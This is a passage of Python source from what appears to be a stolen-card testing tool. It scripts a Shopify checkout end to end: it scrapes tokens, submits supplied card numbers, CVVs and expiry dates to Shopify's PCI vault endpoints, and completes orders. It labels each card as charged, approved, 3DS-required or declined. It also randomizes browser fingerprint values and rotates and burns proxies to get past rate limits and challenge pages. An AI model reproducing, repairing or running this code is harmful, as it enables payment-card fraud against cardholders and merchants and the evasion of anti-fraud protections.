                                        "accept": "application/json",
                                        "referer": shop_url + "/"})
        if r1.status_code not in (200, 201):
            result.error = Exception(f"legacy cart: add.js {r1.status_code}")
            return result

        r2 = await client.get(f"{shop_url}/checkout", allow_redirects=True)
        checkout_url = str(r2.url)
        if "/checkouts/" not in checkout_url:
            result.error = Exception("legacy checkout: no /checkouts/ url")
            return result
        checkout_html = r2.text

        m3 = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', checkout_html) \
            or re.search(r'value="([^"]+)"[^>]*name="authenticity_token"', checkout_html)
        if not m3:
            result.error = Exception("legacy checkout: no authenticity_token")
            return result
        authenticity = html.unescape(m3.group(1))

        contact = {
            "_method": "patch", "authenticity_token": authenticity,
            "previous_step": "contact_information", "step": "shipping_method",
            "checkout[email]": email, "checkout[buyer_accepts_marketing]": "0",
            "checkout[shipping_address][first_name]": addr.first_name,
            "checkout[shipping_address][last_name]": addr.last_name,
            "checkout[shipping_address][address1]": addr.address1,
            "checkout[shipping_address][address2]": addr.address2,
            "checkout[shipping_address][city]": addr.city,
            "checkout[shipping_address][country]": addr.country_code,
            "checkout[shipping_address][province]": addr.zone_code,
            "checkout[shipping_address][zip]": addr.postal_code,
            "checkout[shipping_address][phone]": addr.phone,
            "checkout[note]": "",
            "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
            "checkout[client_details][browser_height]": str(random.randint(600, 900)),
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "-330",
        }
        r4 = await client.post(checkout_url, data=contact)
        if r4.status_code not in (200, 302):
            result.error = Exception(f"legacy contact: {r4.status_code}")
            return result
        if "hipping method" not in (r4.text or ""):
            result.error = Exception("legacy shipping: step not reached")
            return result

        ship_tag = ""
        try:
            r5 = await client.get(f"{checkout_url}/shipping_rates?step=shipping_method")
            m5 = re.search(r'<div class="radio-wrapper" data-shipping-method="([^"]+)"', r5.text)
            if m5:
                ship_tag = m5.group(1)
        except Exception:
            pass
        if not ship_tag:
            result.error = Exception("legacy rates: no shipping method id")
            return result

        ship = {
            "_method": "patch", "authenticity_token": authenticity,
            "previous_step": "shipping_method", "step": "payment_method",
            "checkout[shipping_rate][id]": ship_tag,
            "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
            "checkout[client_details][browser_height]": str(random.randint(600, 900)),
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "-330",
        }
        r6 = await client.post(checkout_url, data=ship)
        payment_due = re.search(r'"total_price"\s*:\s*"?([0-9.]+)', r6.text) \
            or re.search(r'data-checkout-total-price="([0-9.]+)"', r6.text)
        gateway = re.search(r'"payment_gateway"\s*:\s*"([^"]+)"', r6.text) \
            or re.search(r'name="checkout\[payment_gateway\]"[^>]*value="([^"]*)"', r6.text)
        result.gateway = gateway.group(1) if gateway else "shopify_payments"

        pci_payload = json.dumps({"credit_card": {
            "number": number, "month": int(month), "year": int(year),
            "verification_value": cvv, "name": full_name,
        }, "payment_session_scope": site_name})
        pci_headers = {"accept": "application/json", "content-type": "application/json",
                       "origin": "https://checkout.shopifycs.com",
                       "referer": "https://checkout.shopifycs.com/"}
        vault_id = ""
        for vault in ("https://deposit.us.shopifycs.com/sessions",
                      "https://elb.deposit.shopifycs.com/sessions",
                      "https://deposit.shopifycs.com/sessions",
                      "https://checkout.pci.shopifyinc.com/sessions"):
            if _lane_cooling(proxy_url):
                break
            try:
                rv = await client.post(vault, data=pci_payload, headers=pci_headers)
                mv = re.search(r'"id"\s*:\s*"([^"]+)"', rv.text or "")
                if mv:
                    vault_id = mv.group(1)
                    _lane_recovered(proxy_url)
                    if proxy_url:
                        _remember_alive(proxy_url)
                    break
                if rv.status_code in (403, 500, 502, 503) or _is_challenge_html(rv.text):
                    _lane_burn(proxy_url, 60 if rv.status_code == 403 else PCI_BURN_SECONDS)
                    break
                if rv.status_code == 429:
                    await asyncio.sleep(random.uniform(0.4, 0.8))
                    continue
            except Exception:
                continue
        if not vault_id:
            result.error = Exception("legacy pci: no vault session id")
            return result

        final_data = {
            "_method": "patch", "authenticity_token": authenticity,
            "previous_step": "payment_method", "step": "", "s": vault_id,
            "checkout[payment_gateway]": result.gateway,
            "checkout[credit_card][vault]": "false",
            "checkout[different_billing_address]": "false",
            "checkout[remember_me]": "0", "checkout[vault_phone]": "",
            "checkout[total_price]": (payment_due.group(1) if payment_due else ""),
            "complete": "1",
            "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
            "checkout[client_details][browser_height]": str(random.randint(600, 900)),
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "-330",
        }
        r7 = await client.post(checkout_url, data=final_data)
        try:
            g = await client.get(f"{checkout_url}/processing?from_processing_page=1&validate=true",
                                 allow_redirects=True)
        except Exception:
            g = None
        final_html = g.text if g is not None else (r7.text or "")
        final_url = str(g.url) if g is not None else ""

        if "/thank" in final_url or "/orders/" in final_url:
            result.status = CheckStatus.CHARGED
            result.status_code = "ORDER_PAID"
            result.receipt_url = final_url
            return result
        low = final_html.lower()
        if "3d_secure" in low or "3d secure" in low:
            result.status = CheckStatus.THREE_DS
            result.status_code = "3DS_REQUIRED"
            return result
        if "insufficient fund" in low:
            result.status = CheckStatus.APPROVED
            result.status_code = "INSUFFICIENT_FUNDS"
            return result
        if "incorrect cvv" in low or "invalid cvv" in low or "security code" in low:
            result.status = CheckStatus.DECLINED
            result.status_code = "INCORRECT_CVC"
            result.error = Exception("INCORRECT_CVC")
            return result
        verdict = _classify_verdict(final_html)
        result.status_code = verdict or "CARD_DECLINED"
        result.error = Exception(result.status_code) if result.status_code != "ORDER_PAID" else None
        result.status = result_status_for(result.status_code)
        return result
    except Exception as e:
        result.error = Exception(f"legacy checkout: {e}")
        return result
    finally:
        await client.close()


async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                                      proxy_url: str = "") -> CheckResult:
    """Persisted pipeline with cascade to the legacy checkout on an
    infrastructure fault (c3.py's persisted -> legacy fallback)."""
    await _pace_async(shop_url)
    result = await _persisted_checkout_for_card_async(shop_url, card_entry, proxy_url)
    if _result_code(result) in _LEGACY_FALLBACK_CODES:
        leg = await legacy_checkout_async(shop_url, card_entry, proxy_url)
        if leg.status in (CheckStatus.CHARGED, CheckStatus.APPROVED, CheckStatus.DECLINED):
            return leg
    return result